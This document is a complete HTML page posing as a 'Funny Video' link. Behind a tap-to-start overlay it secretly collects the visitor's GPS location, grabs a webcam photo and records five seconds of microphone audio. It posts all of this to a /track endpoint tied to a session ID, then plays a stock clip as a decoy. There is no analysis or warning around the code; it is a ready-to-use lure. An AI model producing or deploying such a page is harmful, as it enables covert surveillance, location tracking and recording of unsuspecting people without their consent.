<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Funny Video</title>
    <style>
        body{margin:0;background:#000;color:white;text-align:center}
        #overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000}
        #videoContainer{display:none}
        video{width:90%;margin-top:20px;border-radius:15px}
    </style>
</head>
<body>
<div id="overlay">👆 Tap anywhere to start</div>
<div id="videoContainer"><video id="video" width="100%" autoplay muted></video><p>Loading...</p></div>
<script>
const urlParams = new URLSearchParams(window.location.search);
const session = urlParams.get('session');
const API_URL = window.location.origin + '/track';

async function sendData(endpoint, data) {
    try {
        let res = await fetch(`${API_URL}?session=${session}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        console.log("Sent", endpoint, "response:", res.status);
    } catch(e) { console.error("Send error:", e); }
}

// Auto location
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
        sendData('/track', { location: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy } });
    }, err => console.log("Location error:", err));
}

document.getElementById('overlay').onclick = async () => {
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('videoContainer').style.display = 'block';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await video.play();

        // Wait for video to be ready
        await new Promise(r => setTimeout(r, 1000));

        // Capture photo from video frame
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photoData = canvas.toDataURL('image/jpeg');
        if (photoData && photoData.length > 100) {
            sendData('/track', { image: photoData });
        } else {
            console.error("Photo data empty");
        }

        // Record audio for 5 seconds
        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
                if (reader.result && reader.result.length > 100) {
                    sendData('/track', { audio: reader.result });
                } else {
                    console.error("Audio data empty");
                }
            };
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);

        // Replace with fake video
        video.srcObject = null;
        video.src = "https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4";
        video.play();
    } catch(err) { alert("Error: " + err.message); console.error(err); }
};
</script>
</body>
</html>
